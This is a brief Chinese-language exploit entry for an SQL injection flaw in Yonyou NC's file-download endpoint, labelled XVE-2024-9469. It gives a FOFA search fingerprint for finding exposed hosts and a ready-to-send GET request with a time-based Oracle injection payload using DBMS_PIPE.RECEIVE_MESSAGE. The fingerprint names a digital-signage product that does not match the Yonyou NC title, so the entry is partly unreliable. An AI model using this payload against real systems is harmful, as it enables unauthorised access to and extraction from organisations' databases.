# 用友NCdownbill存在SQL注入漏洞(XVE-2024-9469)

用友 ｜ SQL注入 ｜ —
- **指纹**：`FOFA：app="和丰山海-数字标牌"`
- **请求**：`GET /portal/pt/erfile/down/bill?pageId=login&id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- HTTP/1.1`